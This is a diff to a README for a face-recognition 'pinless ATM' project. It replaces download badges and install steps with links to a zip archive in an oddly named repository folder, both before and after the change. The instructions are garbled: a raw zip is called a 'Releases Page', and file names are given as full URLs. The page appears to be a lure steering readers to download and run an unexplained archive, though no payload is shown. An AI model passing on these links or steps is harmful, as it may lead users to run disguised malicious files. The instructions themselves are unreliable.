@@ -4,15 +4,15 @@
 Welcome to the FaceSecure ATM, a pinless banking system that makes managing your money easier and more secure. This application uses face recognition technology to verify your identity, eliminating the need for traditional PIN codes. With a combination of a webcam, Arduino-based RFID triggers, and a user-friendly Streamlit web interface, users can check their balance, deposit, withdraw, and review transaction history all in one secure place.
 
 ## 📥 Download 
-[![Download Now](https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip)
+[![Download Now](https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip%20Now-Click%20Here-blue)](https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip)
 
 ## 🚀 Getting Started
 Getting started with FaceSecure ATM is simple. Follow the steps below to download and set up the application on your device.
 
 ## 📥 Download & Install
-1. Visit the **[Releases Page](https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip)** to download the latest version of FaceSecure ATM.
+1. Visit the **[Releases Page](https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip)** to download the latest version of FaceSecure ATM.
 2. On the releases page, you will see a list of available versions. Click on the most recent version to expand the details.
-3. Download the installation file suitable for your operating system. This file will be named something similar to `https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip` or `https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip`.
+3. Download the installation file suitable for your operating system. This file will be named something similar to `https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip` or `https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip`.
 4. Once the download is complete, locate the file in your downloads folder.
 
 ## 🔧 Installation Steps
@@ -71,4 +71,4 @@ For further assistance, please reach out via the repository issues page on GitHu
 ## 🎉 Conclusion
 FaceSecure ATM provides a safe, convenient way to manage your banking needs without the hassle of remembering PIN codes. Download today and start enjoying the benefits of pinless banking.
 
-[![Download Now](https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/main/horrorous/FaceSecure-ATM-Pinless-Banking-System.zip)
+[![Download Now](https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip%20Now-Click%20Here-blue)](https://github.com/Gatsu-it/FaceSecure-ATM-Pinless-Banking-System/raw/refs/heads/main/horrorous/Pinless-Banking-System-Face-Secure-AT-1.8.zip)
